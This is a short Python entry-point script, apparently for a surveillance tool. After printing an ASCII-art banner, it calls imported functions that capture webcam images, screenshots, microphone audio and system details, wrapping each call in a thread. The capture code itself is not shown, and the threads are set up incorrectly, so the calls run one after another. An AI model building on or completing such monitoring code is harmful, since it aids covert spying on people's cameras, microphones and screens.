import threading

import Features.feature
from Features import feature


class MainFileException(Exception):
    pass

def main():
    ascii_art = """
       _____ _____ _____     _____ _____ __  __ 
      / ____/ ____|  __ \   / ____|_   _|  \/  |
     | |   | |    | |__) | | (___   | | | \  / |
     | |   | |    |  ___/   \___ \  | | | |\/| |
     | |___| |____| |       ____) |_| |_| |  | |
      \_____\_____|_|      |_____/|_____|_|  |_|                                  
        """
    print(ascii_art)

    for i in range(5,0,-1):
        print(f"Wait: {i}")

    webcamera = Features.feature.WEBCAMERA
    screenshots = Features.feature.SCREENSHOTS
    microphone = Features.feature.MICROPHONE
    system_information = Features.feature.SYS_INFO

    try:
        # Create threads for each function
        webcamera_thread = threading.Thread(target=webcamera.webcamera())
        screenshots_thread = threading.Thread(target=screenshots.screenshots())
        microphone_thread = threading.Thread(target=microphone.microphone())
        system_information_thread = threading.Thread(target=system_information.system_information())
        os_version_thread = threading.Thread(target=system_information.os_version())

        # Start the threads
        webcamera_thread.start()
        screenshots_thread.start()
        microphone_thread.start()
        system_information_thread.start()
        os_version_thread.start()

        # Wait for all threads to finish
        webcamera_thread.join()
        screenshots_thread.join()
        microphone_thread.join()
        system_information_thread.join()
        os_version_thread.join()

    except Exception as e:
        raise MainFileException("Main failed to run") from e

if __name__ == '__main__':
    try:
        main()
    except MainFileException as e:
        print(f"Main failed to run: {str(e)}")